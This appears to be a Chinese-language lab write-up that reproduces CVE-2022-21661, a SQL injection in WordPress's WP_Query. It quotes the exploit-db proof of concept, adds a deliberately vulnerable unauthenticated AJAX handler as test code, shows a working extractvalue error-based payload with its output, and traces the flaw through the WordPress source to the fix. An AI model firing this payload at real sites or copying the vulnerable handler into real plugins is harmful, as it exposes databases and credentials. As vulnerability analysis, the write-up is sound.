## 漏洞
wpscan确定版本号，找到该版本严重的sql注入漏洞：
https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317

https://www.exploit-db.com/exploits/50663

```
# Exploit Title: WordPress Core 5.8.2 - 'WP_Query' SQL Injection
# Date: 11/01/2022
# Exploit Author: Aryan Chehreghani
# Vendor Homepage: https://wordpress.org
# Software Link: https://wordpress.org/download/releases
# Version: < 5.8.3
# Tested on: Windows 10
# CVE : CVE-2022-21661

# [ VULNERABILITY DETAILS ] : 

#This vulnerability allows remote attackers to disclose sensitive information on affected installations of WordPress Core,
#Authentication is not required to exploit this vulnerability, The specific flaw exists within the WP_Query class,
#The issue results from the lack of proper validation of a user-supplied string before using it to construct SQL queries,
#An attacker can leverage this vulnerability to disclose stored credentials, leading to further compromise.

# [ References ] : 

https://wordpress.org/news/category/releases
https://www.zerodayinitiative.com/advisories/ZDI-22-020
https://hackerone.com/reports/1378209

# [ Sample Request ] :

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Upgrade-Insecure_Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.99
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Connection: close 
Content-Type: application/x-www-form-urlencoded

action=<action_name>&nonce=a85a0c3bfa&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["<inject>"]}}}
```

## 修复
wordpress fix:
https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/

https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214

## 重现
环境搭建去我网站上自己找,不再重复,

注意，目前官方下载的5.8.2版本中已经包含修复，重现需要注释相应代码；
开启debug：define( 'WP_DEBUG', true );

添加测试代码:

方法一:
默认主题直接添加
```
wp-content\themes\twentytwentyone\functions.php:
function wp_query_test(){
	echo 'hello CVE2022-1661';
    $query = stripslashes($_POST['query_vars']);
    $jsonDecodedQuery = json_decode($query,true);
    $wpTest = new WP_Query($jsonDecodedQuery);
    wp_die();
}
add_action('wp_ajax_nopriv_test','wp_query_test',1);
```

方法二:
创建插件并安装
wp_query_test.php
```
<?php
/**
 * Plugin Name: TEST CVE2022-1661
 * Plugin URI: https://www.exploit-db.com/exploits/50663
 * Description: TEST CVE2022-1661
 * Version: 1.0
 * Author: LIU YUE
 * Author URI: http://lyhistory.com
 */
function wp_query_test(){
	echo 'hello CVE2022-1661';
    $query = stripslashes($_POST['query_vars']);
    $jsonDecodedQuery = json_decode($query,true);
    $wpTest = new WP_Query($jsonDecodedQuery);
    wp_die();
}

add_action('wp_ajax_nopriv_test','wp_query_test');

?>
```
压缩成zip,后台安装,activate

firefox hackbar：

```
post:http://testphp.local/wp-admin/admin-ajax.php
payload: action=test&query_vars={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#"]}}}

RESPONSE:
WordPress database error: [XPATH syntax error: '^root@localhost^']
SELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1 AND ( wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,user(),0x5e))#) ) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'attachment' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending'))) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10
```

callstack:
```
wp-admin/admin-ajax.php:
if ( ! has_action( "wp_ajax_nopriv_{$action}" ) ) {
    wp_die( '0', 400 );
}
$wp_filter array(411)
....
wp_ajax_nopriv_test: WP_Hook
...
do_action( "wp_ajax_nopriv_{$action}" );

=>
wp-content\themes\twentytwentyone\functions.php:
function wp_query_test(){
    $c=stripslashes($_POST['data']);
    $d = json_decode($c, true);
    $wp=new WP_Query($d);
    wp_die();
}

wp-includes\class-wp-query.php:
public function __construct( $query = '' ) {
		if ( ! empty( $query ) ) {
			$this->query( $query );
		}
	}

public function query( $query ) {
		$this->init();
		$this->query      = wp_parse_args( $query );
		$this->query_vars = $this->query;
		return $this->get_posts();
	}

public function get_posts() {
		global $wpdb;

		$this->parse_query();    
        ...
        // Taxonomies.
		if ( ! $this->is_singular ) {
			$this->parse_tax_query( $q );   => $this->tax_query = new WP_Tax_Query( $tax_query );

			>>>1: $clauses = $this->tax_query->get_sql( $wpdb->posts, 'ID' );

			$join  .= $clauses['join'];
			$where .= $clauses['where'];
		}
        ...
        $old_request   = "SELECT $found_rows $distinct $fields FROM {$wpdb->posts} $join WHERE 1=1 $where $groupby $orderby $limits";   
        //"SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( 
  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)
) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' O"
		$this->request = $old_request;
        ...
        $this->request = "SELECT $found_rows $distinct {$wpdb->posts}.ID FROM {$wpdb->posts} $join WHERE 1=1 $where $groupby $orderby $limits";
        //"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( 
  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)
) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR (wp_posts.post_type = 'page' AND (wp_posts.post_status = 'publish' "
        $this->request = apply_filters( 'posts_request_ids', $this->request, $this );
        
        >>>2: $ids = $wpdb->get_col( $this->request );
        //WordPress database error XPATH syntax error: '^root@localhost^' for query SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( 
  wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)
) AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish' OR wp_posts.post_status = 'future' OR wp_posts.post_status = 'draft' OR wp_posts.post_status = 'pending')) OR ("

        return $this->posts; array(0)

>>>1:$this->tax_query->get_sql
=>
wp-includes\class-wp-tax-query.php
public function get_sql( $primary_table, $primary_id_column ) {
		$this->primary_table     = $primary_table;
		$this->primary_id_column = $primary_id_column;

		return $this->get_sql_clauses();
	}
=>
$query
array(1)
0: array(5)
taxonomy: ""
terms: array(1)
0: "111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#"
field: "term_taxonomy_id"
operator: "IN"
include_children: true

protected function get_sql_clauses() {
		/*
		 * $queries are passed by reference to get_sql_for_query() for recursion.
		 * To keep $this->queries unaltered, pass a copy.
		 */
		$queries = $this->queries;
		$sql     = $this->get_sql_for_query( $queries );

		if ( ! empty( $sql['where'] ) ) {
			$sql['where'] = ' AND ' . $sql['where'];
		}

		return $sql;
            array(2)
            join: " LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)"
            where: " AND ( 
            wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)
            )"
	}
=>
protected function get_sql_for_query( &$query, $depth = 0 ) {
    ...
    $clause_sql = $this->get_sql_for_clause( $clause, $query );
    ...
    return $sql;
        array(2)
        join: " LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)"
        where: "( 
        wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)
        )"

}   
=>
public function get_sql_for_clause( &$clause, $parent_query ) {
    global $wpdb;
    ...
    $this->clean_query( $clause );
    ...
    $terms = implode( ',', $terms );    //"111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#"
    $where = "$alias.term_taxonomy_id $operator ($terms)"; //"wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)"

	return $sql;
        array(2)
        where: array(1)
        0: "wp_term_relationships.term_taxonomy_id IN (111) and extractvalue(rand(),concat(0x5e,version(),0x5e))#)"
        join: array(1)
        0: " LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id)"
} 
=>
存在bug,sql可以逃逸
private function clean_query( &$query ) {
    ...
    // if ( 'slug' === $query['field'] || 'name' === $query['field'] ) {
        $query['terms'] = array_unique( (array) $query['terms'] );
    // } else {
        // $query['terms'] = wp_parse_id_list( $query['terms'] );
    // }  
    ...
    $this->transform_query( $query, 'term_taxonomy_id' );
}   
term_taxonomy_id
public function transform_query( &$query, $resulting_field ) {
    if ( empty( $query['terms'] ) ) {
        return;
    }

    if ( $query['field'] == $resulting_field ) {
        return;
    }  
    ...
}

>>>2:
wp-includes\wp-db.php
public function get_col( $query = null, $x = 0 ) {
    ...
    $this->query( $query );
    ...
}
public function query( $query ) {
    ...
    $this->print_error();
    ...
}
```
总结：
1. 虽然是核心的bug,触发则是由 theme或者plugin调用的时候传入可控变量引起的
2. 如果没有开启debug模式，则可以使用盲注
   
用你善于发现的眼睛去发现惊喜吧

refer:
https://stackdiary.com/sql-injection-in-wordpress-core-cve-2022-21661/